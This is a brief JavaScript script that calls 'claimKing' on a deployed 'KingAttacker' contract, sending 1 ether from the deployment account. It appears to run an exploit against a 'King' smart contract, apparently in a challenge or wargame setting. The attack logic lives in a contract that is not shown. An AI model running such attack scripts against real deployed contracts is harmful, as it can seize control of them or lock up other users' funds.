const loadContract = require('../lib/load_deployed_contract_at_address')
const { keyToAccount } = require('../lib/eth_utils')
const { DEPLOYMENT_ACCOUNT_KEY } = require('../lib/env')

module.exports = async ({ attackerAddress }) => {
  const owner = keyToAccount(DEPLOYMENT_ACCOUNT_KEY)
  const from = owner.address
  const attacker = await loadContract('KingAttacker', attackerAddress)

  console.log(`Executing claiming to King contract...`)
  const gas = await attacker.claimKing.estimateGas({ from })
  await attacker.claimKing.sendTransaction({ from, gas: gas * 3, value: '1000000000000000000' })
}
